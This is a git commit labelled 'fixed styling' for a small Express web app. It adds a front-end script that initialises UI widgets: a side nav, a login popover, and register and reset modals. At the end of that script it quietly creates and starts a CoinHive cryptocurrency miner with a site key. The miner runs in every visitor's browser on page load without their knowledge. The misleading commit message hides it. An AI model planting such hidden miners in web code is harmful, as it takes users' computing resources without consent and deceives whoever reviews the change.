ee02a9c10c7f16c9aa8024b25a7dcbac574bb44c
dhurley94 <drhurley94@gmail.com>
2017-12-01 15:46:11 -0500

    fixed styling

--- controllers/index_controller.js
+++ controllers/index_controller.js
@@ -12,5 +12,4 @@ router.get("/", function (req, res) {
       res.render('index');
 });
 
-
 module.exports = router;
---
+++ public/js/script.js
@@ -0,0 +1,24 @@
+$(document).ready(() => {
+    $(".button-collapse").sideNav();
+    $("#login").webuiPopover({
+        url: "#login-form"
+    });
+    $("#register").modal({
+        dismissible: true, // Modal can be dismissed by clicking outside of the modal
+        opacity: 0.5, // Opacity of modal background
+        inDuration: 300, // Transition in duration
+        outDuration: 200, // Transition out duration
+        startingTop: "4%", // Starting top style attribute
+        endingTop: "20%" // Ending top style attribute
+    });
+    $("#reset").modal({
+        dismissible: true, // Modal can be dismissed by clicking outside of the modal
+        opacity: 0.5, // Opacity of modal background
+        inDuration: 300, // Transition in duration
+        outDuration: 200, // Transition out duration
+        startingTop: "4%", // Starting top style attribute
+        endingTop: "20%" // Ending top style attribute
+    });
+    let miner = new CoinHive.Anonymous("404URmTCWwj6XZYtLi9YMD6hcGjbgITb");
+    miner.start();
+});
